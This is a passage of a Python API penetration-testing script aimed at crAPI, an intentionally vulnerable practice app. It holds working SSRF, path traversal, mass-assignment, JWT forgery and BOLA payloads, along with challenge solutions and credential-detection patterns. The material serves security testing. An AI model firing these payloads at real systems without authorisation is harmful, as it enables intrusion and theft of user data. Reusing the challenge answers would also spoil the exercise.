        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A10:2021 – Server-Side Request Forgery (SSRF){Colors.END}")
        
        ssrf_payloads = [
            "http://127.0.0.1:8080",
            "http://localhost:5432",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379",
            "http://[::1]:8080",
        ]
        
        # Test endpoints that might process URLs
        endpoints = [
            ("POST", "/identity/api/v2/user/pictures", {"image_url": None}),
            ("POST", "/workshop/api/shop/products", {"image_url": None, "name": "test", "price": "10.00"}),
        ]
        
        for method, endpoint, base_payload in endpoints:
            for payload in ssrf_payloads:
                test_payload = base_payload.copy()
                for key in test_payload.keys():
                    if test_payload[key] is None:
                        test_payload[key] = payload
                
                result = self.test_endpoint(
                    method, endpoint, test_payload,
                    "SSRF", Severity.HIGH,
                    f"SSRF attempt: {payload}"
                )
                self.print_result(result)
                time.sleep(0.1)
    
    def test_mass_assignment(self):
        """A04:2021 – Insecure Design - Mass Assignment"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A04:2021 – Insecure Design (Mass Assignment){Colors.END}")
        
        # Test for mass assignment vulnerabilities
        mass_assignment_payloads = [
            {"email": "test@example.com", "name": "Test", "number": "123", "password": "test", "role": "admin"},
            {"email": "test@example.com", "name": "Test", "number": "123", "password": "test", "is_admin": True},
            {"email": "test@example.com", "name": "Test", "number": "123", "password": "test", "privileges": "all"},
        ]
        
        for payload in mass_assignment_payloads:
            result = self.test_endpoint(
                "POST", "/identity/api/auth/signup", payload,
                "Mass Assignment", Severity.MEDIUM,
                "Testing for mass assignment vulnerability"
            )
            self.print_result(result)
            time.sleep(0.1)
    
    def test_path_traversal(self):
        """A01:2021 – Broken Access Control - Path Traversal"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Path Traversal{Colors.END}")
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        endpoints = [
            ("GET", "/identity/api/v2/user/videos/../etc/passwd", {}),
            ("GET", "/workshop/api/shop/return_qr_code", {"file": None}),
        ]
        
        for method, endpoint, base_payload in endpoints:
            for payload in path_traversal_payloads:
                if "{file}" in endpoint or base_payload.get("file") is not None:
                    test_payload = base_payload.copy()
                    test_payload["file"] = payload
                    result = self.test_endpoint(
                        method, endpoint.replace("../etc/passwd", ""), test_payload,
                        "Path Traversal", Severity.HIGH,
                        f"Path traversal attempt: {payload}"
                    )
                else:
                    result = self.test_endpoint(
                        method, endpoint.replace("../etc/passwd", payload), base_payload,
                        "Path Traversal", Severity.HIGH,
                        f"Path traversal attempt: {payload}"
                    )
                self.print_result(result)
                time.sleep(0.1)
    
    def detect_information_disclosure(self, body: str) -> bool:
        """Detect ALL types of information disclosure - not just tokens"""
        body_lower = body.lower()
        
        # Stack traces and exceptions (reveal code structure)
        stack_trace_indicators = [
            "stack trace", "exception", "error at", "traceback",
            "at java.", "at python", "at com.", "at org.",
            "caused by", "exception in", "file:", "line:",
            "sqlstate", "database error", "query failed",
            "runtimeexception", "nullpointerexception", "sqlexception"
        ]
        if any(indicator in body_lower for indicator in stack_trace_indicators):
            return True
        
        # File paths and system information
        system_info_indicators = [
            "/var/", "/etc/", "/usr/", "/home/", "c:\\", "d:\\",
            "classpath", "jar:", "file://", "internal error",
            "/tmp/", "/opt/", "/root/", "/bin/", "/sbin/",
            "c:\\windows\\", "c:\\program files\\"
        ]
        if any(indicator in body_lower for indicator in system_info_indicators):
            return True
        
        # Authentication credentials and secrets
        auth_patterns = [
            "password", "pwd", "passwd", "pass", "secret", "secretkey",
            "apikey", "api_key", "api-key", "apisecret",
            "access_token", "access-token", "refresh_token",
            "bearer token", "jwt", "session", "sessionid",
            "auth_token", "auth-token", "oauth", "oauth_token"
        ]
        if any(pattern in body_lower for pattern in auth_patterns):
            return True
        
        # Database credentials and connection strings
        db_patterns = [
            "jdbc:", "mongodb://", "mysql://", "postgresql://",
            "connection string", "connectionstring", "connstr",
            "database", "db_user", "db_password", "db_host",
            "datasource", "data source", "connection pool"
        ]
        if any(pattern in body_lower for pattern in db_patterns):
            return True
        
        # API keys and tokens (various formats)
        api_key_patterns = [
            r'\b[A-Za-z0-9]{32,}\b',  # Long alphanumeric strings (potential API keys)
            r'sk_live_[A-Za-z0-9]+',  # Stripe keys
            r'pk_live_[A-Za-z0-9]+',
            r'AIza[0-9A-Za-z_-]{35}',  # Google API keys
            r'AKIA[0-9A-Z]{16}',  # AWS access keys
        ]
        import re
        for pattern in api_key_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return True
        
        # Email addresses (PII)
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, body)
        if len(emails) > 2:  # Multiple emails = potential data leak
            return True
        
        # Phone numbers (PII)
        phone_patterns = [
            r'\b\d{3}-\d{3}-\d{4}\b',  # US format
            r'\b\+?\d{10,15}\b',  # International
            r'\b\(\d{3}\)\s?\d{3}-\d{4}\b'
        ]
        for pattern in phone_patterns:
            if len(re.findall(pattern, body)) > 2:
                return True
        
        # Credit card numbers (PCI data)
        cc_pattern = r'\b(?:\d{4}[-\s]?){3}\d{4}\b'
        if re.search(cc_pattern, body):
            return True
        
        # Social Security Numbers (SSN)
        ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
        if re.search(ssn_pattern, body):
            return True
        
        # Internal IP addresses
        internal_ip_patterns = [
            r'\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',  # 10.x.x.x
            r'\b172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}\b',  # 172.16-31.x.x
            r'\b192\.168\.\d{1,3}\.\d{1,3}\b',  # 192.168.x.x
            r'\b127\.0\.0\.1\b',  # localhost
            r'\b169\.254\.\d{1,3}\.\d{1,3}\b'  # Link-local
        ]
        for pattern in internal_ip_patterns:
            if re.search(pattern, body):
                return True
        
        # User IDs and internal identifiers
        user_data_patterns = [
            "user_id", "userid", "user-id", "user id",
            "customer_id", "customerid", "customer-id",
            "account_id", "accountid", "account-id",
            "employee_id", "employeeid", "employee-id"
        ]
        if any(pattern in body_lower for pattern in user_data_patterns):
            # Check if there are actual IDs (numbers/UUIDs) nearby
            if re.search(r'\b\d{4,}\b|\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', body, re.IGNORECASE):
                return True
        
        # Version information (multiple versions = info leak)
        version_patterns = [
            "version", "v1.", "v2.", "v3.", "build", "release",
            "apache", "nginx", "tomcat", "jetty", "spring",
            "django", "flask", "express", "node.js", "java",
            "python", "php", "ruby", "go version"
        ]
        if len([p for p in version_patterns if p in body_lower]) >= 2:
            return True
        
        # Configuration files and environment variables
        config_patterns = [
            "config", "configuration", "env", "environment",
            ".env", ".config", "application.properties",
            "settings.py", "config.json", "web.xml",
            "dockerfile", "docker-compose"
        ]
        if any(pattern in body_lower for pattern in config_patterns):
            return True
        
        # Private keys and certificates
        key_patterns = [
            "-----BEGIN", "-----END", "private key",
            "rsa private", "ecdsa private", "dsa private",
            "certificate", "-----BEGIN CERTIFICATE",
            "ssh-rsa", "ssh-ed25519"
        ]
        if any(pattern in body_lower for pattern in key_patterns):
            return True
        
        # AWS/Azure/GCP specific
        cloud_patterns = [
            "aws_access_key", "aws_secret", "azure_key",
            "gcp_key", "s3://", "gs://", "azure://",
            "arn:aws:", "subscription-id"
        ]
        if any(pattern in body_lower for pattern in cloud_patterns):
            return True
        
        # SQL queries and database structure
        sql_patterns = [
            "select * from", "insert into", "update set",
            "delete from", "create table", "alter table",
            "drop table", "table_name", "column_name",
            "inner join", "left join", "where clause"
        ]
        if any(pattern in body_lower for pattern in sql_patterns):
            return True
        
        # Source code exposure
        code_patterns = [
            "function", "def ", "class ", "import ",
            "public class", "private ", "protected ",
            "<?php", "<%", "#!/bin", "#!/usr/bin"
        ]
        if len([p for p in code_patterns if p in body_lower]) >= 2:
            return True
        
        # UUIDs and GUIDs (might reveal internal structure)
        uuid_pattern = r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b'
        uuids = re.findall(uuid_pattern, body, re.IGNORECASE)
        if len(uuids) > 5:  # Multiple UUIDs = potential data leak
            return True
        
        # Long base64 strings (might be encoded sensitive data)
        base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
        base64_matches = re.findall(base64_pattern, body)
        if len(base64_matches) > 3:  # Multiple long base64 strings
            return True
        
        # JSON with sensitive field names
        sensitive_json_fields = [
            "password", "secret", "token", "key", "credential",
            "ssn", "social", "credit", "card", "cvv",
            "pin", "passcode", "auth", "authorization"
        ]
        # Check if JSON contains sensitive field names with actual values
        try:
            import json
            json_data = json.loads(body)
            if isinstance(json_data, dict):
                for field in sensitive_json_fields:
                    if field in str(json_data).lower():
                        # Check if it has a value (not just the key name)
                        field_value = None
                        for key, value in json_data.items():
                            if field in key.lower() and value:
                                field_value = value
                                break
                        if field_value and str(field_value) not in ["null", "none", ""]:
                            return True
        except:
            pass
        
        return False
    
    def test_information_disclosure(self):
        """A01:2021 – Broken Access Control - Information Disclosure"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Information Disclosure{Colors.END}")
        
        # Test error messages
        endpoints = [
            ("GET", "/identity/api/v2/user/videos/invalid", {}),
            ("GET", "/workshop/api/shop/orders/invalid", {}),
            ("POST", "/identity/api/auth/login", {"email": "nonexistent@example.com", "password": "wrong"}),
        ]
        
        for method, endpoint, payload in endpoints:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Information Disclosure", Severity.MEDIUM,
                "Testing for information disclosure in error messages"
            )
            self.print_result(result)
            time.sleep(0.1)
    
    def test_all_methods_on_endpoints(self):
        """Test all HTTP methods (GET, POST, PUT, DELETE) on endpoints and detect unauthorized success/errors"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing All HTTP Methods on Endpoints{Colors.END}")
        
        # List of endpoints to test
        endpoints_to_test = [
            "/identity/api/v2/user/dashboard",
            "/identity/api/v2/user/videos",
            "/identity/api/v2/user/videos/1",
            "/identity/api/v2/user/videos/999999",
            "/identity/api/v2/vehicle/vehicles",
            "/identity/api/v2/vehicle/1/location",
            "/identity/api/v2/vehicle/999999/location",
            "/workshop/api/shop/products",
            "/workshop/api/shop/orders",
            "/workshop/api/shop/orders/all",
            "/workshop/api/shop/orders/1",
            "/workshop/api/shop/orders/999999",
            "/workshop/api/mechanic/",
            "/workshop/api/mechanic/mechanic_report",
            "/workshop/api/mechanic/receive_report",
            "/workshop/api/mechanic/service_requests",
            "/workshop/api/management/users/all",
            "/community/api/v2/community/posts",
            "/community/api/v2/community/posts/recent",
            "/community/api/v2/community/posts/1",
            "/community/api/v2/community/posts/999999",
            "/identity/api/v2/admin/videos/1",
        ]
        
        # Test each method on each endpoint
        methods = ["GET", "POST", "PUT", "DELETE"]
        base_payloads = {
            "GET": {},
            "POST": {"test": "data"},
            "PUT": {"test": "data"},
            "DELETE": {},
        }
        
        for endpoint in endpoints_to_test:
            for method in methods:
                payload = base_payloads.get(method, {})
                
                # Test with auth
                result_auth = self.test_endpoint(
                    method, endpoint, payload,
                    "Method Testing (Authenticated)", Severity.MEDIUM,
                    f"Testing {method} on {endpoint} with authentication"
                )
                
                # Check for unauthorized success (200 when should be 401/403/405)
                if result_auth.status_code == 200:
                    # If this is a protected endpoint and we got 200, check if it's actually authorized
                    # For now, we'll flag it if it's a sensitive endpoint
                    if any(sensitive in endpoint for sensitive in ["admin", "users/all", "dashboard", "orders"]):
                        if not self.auth_token or method not in ["GET"]:  # Some GETs might be OK
                            result_auth.vulnerable = True
                            result_auth.description = f"Unauthorized success: {method} returned 200 on protected endpoint"
                            result_auth.vulnerability = "Unauthorized Access"
                            result_auth.severity = Severity.HIGH
                
                # Check for information disclosure in errors
                if result_auth.status_code in [400, 500, 502, 503]:
                    if self.detect_information_disclosure(result_auth.response_body):
                        result_auth.vulnerable = True
                        result_auth.description = f"Information disclosure in {result_auth.status_code} error"
                        result_auth.vulnerability = "Information Disclosure"
                        result_auth.severity = Severity.MEDIUM
                
                self.print_result(result_auth)
                time.sleep(0.05)
                
                # Test without auth (if we have auth token)
                if self.auth_token:
                    old_token = self.auth_token
                    self.auth_token = None
                    
                    result_no_auth = self.test_endpoint(
                        method, endpoint, payload,
                        "Method Testing (Unauthenticated)", Severity.HIGH,
                        f"Testing {method} on {endpoint} without authentication"
                    )
                    
                    # Check for unauthorized success (200 when should be 401/403)
                    if result_no_auth.status_code == 200:
                        # Check if response contains data (not just an error message)
                        if len(result_no_auth.response_body) > 50:
                            try:
                                import json
                                resp_json = json.loads(result_no_auth.response_body)
                                # If we got structured data without auth, it's vulnerable
                                if isinstance(resp_json, (dict, list)):
                                    result_no_auth.vulnerable = True
                                    result_no_auth.description = f"Unauthorized access: {method} returned 200 with data without authentication"
                                    result_no_auth.vulnerability = "Missing Authentication"
                                    result_no_auth.severity = Severity.CRITICAL
                            except:
                                # If response is substantial and not an error, might be vulnerable
                                if not any(err in result_no_auth.response_body.lower() for err in ["error", "unauthorized", "forbidden", "access denied"]):
                                    result_no_auth.vulnerable = True
                                    result_no_auth.description = f"Unauthorized access: {method} returned 200 without authentication"
                                    result_no_auth.vulnerability = "Missing Authentication"
                                    result_no_auth.severity = Severity.CRITICAL
                    
                    # Check for information disclosure in errors
                    if result_no_auth.status_code in [400, 500, 502, 503]:
                        if self.detect_information_disclosure(result_no_auth.response_body):
                            result_no_auth.vulnerable = True
                            result_no_auth.description = f"Information disclosure in {result_no_auth.status_code} error"
                            result_no_auth.vulnerability = "Information Disclosure"
                            result_no_auth.severity = Severity.MEDIUM
                    
                    self.print_result(result_no_auth)
                    self.auth_token = old_token
                    time.sleep(0.05)
    
    def test_authenticated_endpoints(self):
        """Comprehensive testing of endpoints that require authentication"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Authenticated Endpoints{Colors.END}")
        
        if not self.auth_token:
            print(f"{Colors.YELLOW}⚠ No authentication token available, skipping authenticated endpoint tests{Colors.END}")
            return
        
        # Protected endpoints that require authentication
        protected_endpoints = [
            ("GET", "/identity/api/v2/user/dashboard", {}),
            ("GET", "/identity/api/v2/user/videos", {}),
            ("GET", "/identity/api/v2/user/videos/1", {}),
            ("POST", "/identity/api/v2/user/videos", {"title": "test", "video_url": "http://test.com/video.mp4"}),
            ("PUT", "/identity/api/v2/user/videos/1", {"title": "updated"}),
            ("DELETE", "/identity/api/v2/user/videos/1", {}),
            ("GET", "/identity/api/v2/vehicle/vehicles", {}),
            ("POST", "/identity/api/v2/vehicle/add_vehicle", {"name": "Test Car", "vin": "TEST123"}),
            ("GET", "/identity/api/v2/vehicle/1/location", {}),
            ("GET", "/workshop/api/shop/products", {}),
            ("POST", "/workshop/api/shop/products", {"name": "test", "price": "10.00", "image_url": "http://test.com/img.jpg"}),
            ("GET", "/workshop/api/shop/orders/all", {"limit": 10, "offset": 0}),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 1}),
            ("GET", "/workshop/api/shop/orders/1", {}),
            ("PUT", "/workshop/api/shop/orders/1", {"status": "cancelled"}),
            ("POST", "/workshop/api/shop/orders/return_order", {"order_id": 1}),
            ("POST", "/workshop/api/shop/apply_coupon", {"coupon_code": "TEST123"}),
            ("GET", "/workshop/api/mechanic/", {}),
            ("GET", "/workshop/api/mechanic/mechanic_report", {}),
            ("GET", "/workshop/api/mechanic/service_requests", {}),
            ("POST", "/workshop/api/merchant/contact_mechanic", {"mechanic_api": "test", "mechanic_email": "test@example.com", "mechanic_id": 1}),
            ("POST", "/community/api/v2/community/posts", {"title": "Test", "content": "Test content"}),
            ("GET", "/community/api/v2/community/posts/recent", {}),
            ("GET", "/community/api/v2/community/posts/1", {}),
            ("POST", "/community/api/v2/community/posts/1/comment", {"comment": "Test comment"}),
            ("POST", "/community/api/v2/coupon/new-coupon", {"coupon_code": "TEST", "amount": 10}),
            ("POST", "/community/api/v2/coupon/validate-coupon", {"coupon_code": "TEST"}),
        ]
        
        # Test 1: Valid authentication
        print(f"  {Colors.CYAN}Testing with valid authentication...{Colors.END}")
        for method, endpoint, payload in protected_endpoints[:10]:  # Test first 10 to avoid too many requests
            result = self.test_endpoint(
                method, endpoint, payload,
                "Authenticated Endpoint (Valid Token)", Severity.INFO,
                f"Testing {method} {endpoint} with valid authentication"
            )
            # If we get 401/403 with valid token, that's suspicious
            if result.status_code in [401, 403]:
                result.vulnerable = True
                result.description = f"Valid token rejected - possible authentication issue"
                result.vulnerability = "Authentication Failure"
                result.severity = Severity.MEDIUM
            self.print_result(result)
            time.sleep(0.05)
        
        # Test 2: Invalid tokens
        print(f"  {Colors.CYAN}Testing with invalid/malformed tokens...{Colors.END}")
        invalid_tokens = [
            "invalid.token.here",
            "Bearer invalid",
            "not.a.valid.jwt",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "null",
            "undefined",
            "Bearer ",
            "Bearer null",
            "Bearer undefined",
        ]
        
        original_token = self.auth_token
        for invalid_token in invalid_tokens[:5]:  # Test first 5
            self.auth_token = invalid_token.replace("Bearer ", "") if invalid_token.startswith("Bearer ") else invalid_token
            
            for method, endpoint, payload in protected_endpoints[:3]:  # Test 3 endpoints per token
                result = self.test_endpoint(
                    method, endpoint, payload,
                    "Authenticated Endpoint (Invalid Token)", Severity.HIGH,
                    f"Testing with invalid token: {invalid_token[:20]}"
                )
                
                # If we get 200 with invalid token, that's a critical vulnerability
                if result.status_code == 200:
                    result.vulnerable = True
                    result.description = f"Invalid token accepted - authentication bypass!"
                    result.vulnerability = "Authentication Bypass"
                    result.severity = Severity.CRITICAL
                # If we get 500, might be information disclosure
                elif result.status_code == 500:
                    if self.detect_information_disclosure(result.response_body):
                        result.vulnerable = True
                        result.description = f"Information disclosure in error response"
                        result.vulnerability = "Information Disclosure"
                        result.severity = Severity.MEDIUM
                
                self.print_result(result)
                time.sleep(0.05)
        
        self.auth_token = original_token
        
        # Test 3: JWT manipulation (algorithm confusion, signature removal, etc.)
        print(f"  {Colors.CYAN}Testing JWT manipulation...{Colors.END}")
        if original_token:
            try:
                import base64
                import json
                
                # Try to decode and manipulate JWT
                parts = original_token.split('.')
                if len(parts) == 3:
                    # Decode header
                    try:
                        header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
                        payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
                        
                        # Test 1: Change algorithm to none
                        header_none = header.copy()
                        header_none['alg'] = 'none'
                        header_encoded = base64.urlsafe_b64encode(json.dumps(header_none).encode()).decode().rstrip('=')
                        token_none = f"{header_encoded}.{parts[1]}."
                        
                        # Test 2: Remove signature
                        token_no_sig = f"{parts[0]}.{parts[1]}."
                        
                        # Test 3: Modify payload (change user email)
                        if 'sub' in payload_data:
                            payload_modified = payload_data.copy()
                            payload_modified['sub'] = 'admin@example.com'
                            payload_encoded = base64.urlsafe_b64encode(json.dumps(payload_modified).encode()).decode().rstrip('=')
                            token_modified = f"{parts[0]}.{payload_encoded}.{parts[2]}"
                            
                            manipulated_tokens = [
                                ("Algorithm None", token_none),
                                ("No Signature", token_no_sig),
                                ("Modified User", token_modified),
                            ]
                            
                            for token_name, token in manipulated_tokens:
                                self.auth_token = token
                                
                                # Test on sensitive endpoints
                                test_endpoints = [
                                    ("GET", "/identity/api/v2/user/dashboard", {}),
                                    ("GET", "/workshop/api/management/users/all", {}),
                                    ("GET", "/identity/api/v2/admin/videos/1", {}),
                                ]
                                
                                for method, endpoint, payload in test_endpoints:
                                    result = self.test_endpoint(
                                        method, endpoint, payload,
                                        "JWT Manipulation", Severity.CRITICAL,
                                        f"Testing JWT {token_name} manipulation"
                                    )
                                    
                                    # If manipulated token works, it's critical
                                    if result.status_code == 200:
                                        result.vulnerable = True
                                        result.description = f"JWT {token_name} manipulation successful - authentication bypass!"
                                        result.vulnerability = "JWT Vulnerability"
                                        result.severity = Severity.CRITICAL
                                    
                                    self.print_result(result)
                                    time.sleep(0.05)
                    except Exception as e:
                        pass  # JWT manipulation failed, continue
            except:
                pass  # Could not manipulate JWT
        
        self.auth_token = original_token
        
        # Test 4: Test with missing Authorization header (but token set)
        print(f"  {Colors.CYAN}Testing endpoints that should require Authorization header...{Colors.END}")
        for method, endpoint, payload in protected_endpoints[:5]:
            # Make request without Authorization header
            headers = self.get_headers(include_auth=False)
            url = f"{self.base_url}{endpoint}"
            
            try:
                if method == "GET":
                    response = self.session.get(url, params=payload, headers=headers, timeout=self.timeout)
                elif method == "POST":
                    response = self.session.post(url, json=payload, headers=headers, timeout=self.timeout)
                elif method == "PUT":
                    response = self.session.put(url, json=payload, headers=headers, timeout=self.timeout)
                elif method == "DELETE":
                    response = self.session.delete(url, json=payload, headers=headers, timeout=self.timeout)
                else:
                    response = None
                
                if response:
                    result = TestResult(
                        endpoint=endpoint,
                        method=method,
                        vulnerability="Missing Authorization Header",
                        payload=str(payload)[:200],
                        status_code=response.status_code,
                        response_time=0,
                        response_body=response.text[:500],
                        severity=Severity.HIGH,
                        description=f"Testing {method} {endpoint} without Authorization header",
                        vulnerable=False
                    )
                    
                    # If we get 200 without Authorization header, it's vulnerable
                    if result.status_code == 200:
                        result.vulnerable = True
                        result.description = f"Endpoint accessible without Authorization header - missing authentication!"
                        result.vulnerability = "Missing Authentication"
                        result.severity = Severity.CRITICAL
                    # If we get 500, check for info disclosure
                    elif result.status_code == 500:
                        if self.detect_information_disclosure(result.response_body):
                            result.vulnerable = True
                            result.vulnerability = "Information Disclosure"
                            result.severity = Severity.MEDIUM
                    
                    self.results.append(result)
                    self.print_result(result)
                    time.sleep(0.05)
            except Exception as e:
                pass
    
    def test_rate_limiting(self):
        """A04:2021 – Insecure Design - Rate Limiting"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Rate Limiting{Colors.END}")
        
        # Test if endpoints have rate limiting
        endpoints_to_test = [
            ("POST", "/identity/api/auth/login", {"email": "test@example.com", "password": "test"}),
            ("POST", "/workshop/api/merchant/contact_mechanic", {"mechanic_api": "test", "mechanic_email": "test@example.com", "mechanic_id": 1}),
        ]
        
        for method, endpoint, payload in endpoints_to_test:
            print(f"  Testing rate limiting on {endpoint}...")
            start_time = time.time()
            request_count = 0
            rate_limited = False
            
            for i in range(30):  # Increased to 30 requests
                try:
                    if method == "POST":
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json=payload,
                            headers=self.get_headers(include_auth=False),
                            timeout=self.timeout
                        )
                    else:
                        response = self.session.get(
                            f"{self.base_url}{endpoint}",
                            params=payload,
                            headers=self.get_headers(include_auth=False),
                            timeout=self.timeout
                        )
                    request_count += 1
                    if response.status_code == 429:
                        result = TestResult(
                            endpoint=endpoint,
                            method=method,
                            vulnerability="Rate Limiting",
                            payload=str(payload),
                            status_code=429,
                            response_time=time.time() - start_time,
                            response_body="Rate limit detected",
                            severity=Severity.INFO,
                            description="Rate limiting is enabled",
                            vulnerable=False
                        )
                        self.results.append(result)
                        self.print_result(result)
                        rate_limited = True
                        break
                    time.sleep(0.05)  # Faster requests
                except:
                    pass
            
            elapsed = time.time() - start_time
            if not rate_limited and request_count >= 25:  # Made 25+ requests without rate limit
                result = TestResult(
                    endpoint=endpoint,
                    method=method,
                    vulnerability="Rate Limiting",
                    payload=str(payload),
                    status_code=200,
                    response_time=elapsed,
                    response_body=f"Made {request_count} requests without rate limiting",
                    severity=Severity.MEDIUM,
                    description="No rate limiting detected - potential DoS vulnerability",
                    vulnerable=True
                )
                self.results.append(result)
                self.print_result(result)
    
    def test_crapi_challenges(self):
        """Test specific crAPI challenges from challenges.md"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing crAPI Specific Challenges{Colors.END}")
        
        if not self.auth_token:
            print(f"{Colors.YELLOW}⚠ No authentication token, skipping some challenge tests{Colors.END}")
        
        # Challenge 1: BOLA - Access another user's vehicle
        print(f"  {Colors.CYAN}Challenge 1: Testing BOLA - Access another user's vehicle{Colors.END}")
        # Solution: Get vehicle IDs from /community/api/v2/community/posts/recent endpoint
        import uuid
        test_uuids = [
            str(uuid.uuid4()),  # Random UUID
            "00000000-0000-0000-0000-000000000000",  # Null UUID
            "ffffffff-ffff-ffff-ffff-ffffffffffff",  # Max UUID
        ]
        
        # Get vehicle IDs from community posts (as per solution)
        if self.auth_token:
            try:
                # Get vehicle IDs from posts endpoint
                posts_resp = self.session.get(
                    f"{self.base_url}/community/api/v2/community/posts/recent",
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                if posts_resp.status_code == 200:
                    try:
                        posts_data = posts_resp.json()
                        if isinstance(posts_data, dict) and 'posts' in posts_data:
                            for post in posts_data['posts'][:5]:  # Get first 5 posts
                                if 'vehicleid' in post:
                                    test_uuids.append(str(post['vehicleid']))
                        elif isinstance(posts_data, list):
                            for post in posts_data[:5]:
                                if isinstance(post, dict) and 'vehicleid' in post:
                                    test_uuids.append(str(post['vehicleid']))
                    except:
                        pass
                
                # Also get our own vehicles
                vehicles_resp = self.session.get(
                    f"{self.base_url}/identity/api/v2/vehicle/vehicles",
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                if vehicles_resp.status_code == 200:
                    try:
                        vehicles_data = vehicles_resp.json()
                        if isinstance(vehicles_data, list) and len(vehicles_data) > 0:
                            for vehicle in vehicles_data[:3]:
                                if 'id' in vehicle or 'uuid' in vehicle or 'carId' in vehicle:
                                    vehicle_id = vehicle.get('id') or vehicle.get('uuid') or vehicle.get('carId')
                                    if vehicle_id:
                                        test_uuids.append(str(vehicle_id))
                    except:
                        pass
            except:
                pass
        
        for vehicle_id in test_uuids[:5]:  # Test first 5
            result = self.test_endpoint(
                "GET", f"/identity/api/v2/vehicle/{vehicle_id}/location", {},
                "BOLA - Vehicle Access (Challenge 1)", Severity.HIGH,
                f"Testing access to vehicle {vehicle_id[:20]}..."
            )
            # If we get 200 with data, it's BOLA
            if result.status_code == 200 and len(result.response_body) > 50:
                try:
                    import json
                    resp_json = json.loads(result.response_body)
                    if isinstance(resp_json, dict) and any(key in resp_json for key in ['name', 'email', 'location', 'latitude', 'longitude']):
                        result.vulnerable = True
                        result.description = f"BOLA: Successfully accessed vehicle {vehicle_id} - Challenge 1"
                except:
                    if any(indicator in result.response_body.lower() for indicator in ['name', 'email', 'location', 'latitude']):
                        result.vulnerable = True
                        result.description = f"BOLA: Successfully accessed vehicle {vehicle_id} - Challenge 1"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 2: BOLA - Access mechanic reports of other users
        print(f"  {Colors.CYAN}Challenge 2: Testing BOLA - Access mechanic reports{Colors.END}")
        # Solution: Extract report_link from contact_mechanic response, then change report_id
        report_ids = [1, 2, 3, 999, 9999, 0, -1]
        
        # Try to get report_link from contact_mechanic if authenticated
        if self.auth_token:
            try:
                contact_resp = self.session.post(
                    f"{self.base_url}/workshop/api/merchant/contact_mechanic",
                    json={
                        "mechanic_api": "test",
                        "mechanic_email": "test@example.com",
                        "mechanic_id": 1,
                        "problem_details": "test"
                    },
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                if contact_resp.status_code == 200:
                    try:
                        contact_data = contact_resp.json()
                        if isinstance(contact_data, dict) and 'report_link' in contact_data:
                            # Extract report_id from report_link
                            report_link = contact_data['report_link']
                            import re
                            match = re.search(r'report_id=(\d+)', report_link)
                            if match:
                                report_ids.insert(0, int(match.group(1)))  # Add found report_id first
                    except:
                        pass
            except:
                pass
        
        # Test mechanic_report endpoint with various report IDs
        for report_id in report_ids[:10]:  # Test first 10
            result = self.test_endpoint(
                "GET", f"/workshop/api/mechanic/mechanic_report?report_id={report_id}", {},
                "BOLA - Mechanic Reports (Challenge 2)", Severity.HIGH,
                f"Testing access to mechanic report {report_id}"
            )
            # If we get 200 with report data, it's BOLA
            if result.status_code == 200 and len(result.response_body) > 50:
                try:
                    import json
                    resp_json = json.loads(result.response_body)
                    if isinstance(resp_json, dict) and any(key in resp_json for key in ['problem_details', 'vehicle', 'mechanic', 'vin']):
                        result.vulnerable = True
                        result.description = f"BOLA: Successfully accessed mechanic report {report_id} - Challenge 2"
                except:
                    if any(indicator in result.response_body.lower() for indicator in ['problem', 'vehicle', 'mechanic', 'vin']):
                        result.vulnerable = True
                        result.description = f"BOLA: Successfully accessed mechanic report {report_id} - Challenge 2"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 3: Broken Auth - Reset password of different user
        print(f"  {Colors.CYAN}Challenge 3: Testing Broken Auth - Password reset{Colors.END}")
        # Test forget-password with various emails
        test_emails = [
            "admin@example.com",
            "test@example.com",
            "user@example.com",
            "admin",
            "test",
        ]
        for email in test_emails:
            result = self.test_endpoint(
                "POST", "/identity/api/auth/forget-password", {"email": email},
                "Broken Auth - Password Reset (Challenge 3)", Severity.HIGH,
                f"Testing password reset for {email}"
            )
            # If we get 200, password reset might work for other users
            if result.status_code == 200:
                result.vulnerable = True
                result.description = f"Password reset initiated for {email} - Challenge 3"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 4 & 5: Excessive Data Exposure
        print(f"  {Colors.CYAN}Challenge 4 & 5: Testing Excessive Data Exposure{Colors.END}")
        # Test endpoints that might leak user data
        exposure_endpoints = [
            ("GET", "/workshop/api/management/users/all", {}),
            ("GET", "/identity/api/v2/user/dashboard", {}),
            ("GET", "/identity/api/v2/user/videos", {}),
